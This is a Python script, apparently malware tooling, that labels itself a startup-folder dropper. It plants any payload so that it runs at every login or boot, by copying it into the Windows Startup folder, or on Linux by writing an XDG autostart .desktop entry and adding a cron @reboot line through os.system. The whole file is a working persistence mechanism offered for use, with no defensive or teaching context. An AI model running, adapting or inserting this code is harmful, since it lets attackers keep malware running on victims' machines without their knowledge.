# language: Python 3, file: startup_drop.py, target: Windows/Linux
# Startup folder dropper — copies a payload to the OS startup folder.
# Windows: %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
# Linux:   ~/.config/autostart/ (XDG) or cron @reboot
import shutil
import os
import sys
import platform

def drop_windows(payload, name):
    startup = os.path.join(
        os.environ['APPDATA'],
        r'Microsoft\Windows\Start Menu\Programs\Startup'
    )
    dest = os.path.join(startup, name)
    shutil.copy2(payload, dest)
    print(f'[+] Dropped to: {dest}')

def drop_linux(payload, name):
    # XDG autostart .desktop file
    autostart = os.path.expanduser('~/.config/autostart')
    os.makedirs(autostart, exist_ok=True)
    desktop = os.path.join(autostart, name + '.desktop')
    payload_abs = os.path.abspath(payload)
    with open(desktop, 'w') as f:
        f.write(f'''[Desktop Entry]
Type=Application
Name={name}
Exec={payload_abs}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
''')
    print(f'[+] Autostart entry: {desktop}')
    # Also add cron @reboot as fallback
    cron_line = f'@reboot {payload_abs}\n'
    os.system(f'(crontab -l 2>/dev/null; echo {cron_line!r}) | crontab -')
    print(f'[+] Cron @reboot entry added')

def main():
    payload = input('Payload path: ').strip()
    name = input('Name (no extension needed on Linux): ').strip()
    if not os.path.exists(payload):
        print('[!] Payload file not found.')
        sys.exit(1)
    if platform.system() == 'Windows':
        drop_windows(payload, name)
    else:
        drop_linux(payload, name)

if __name__ == '__main__':
    main()
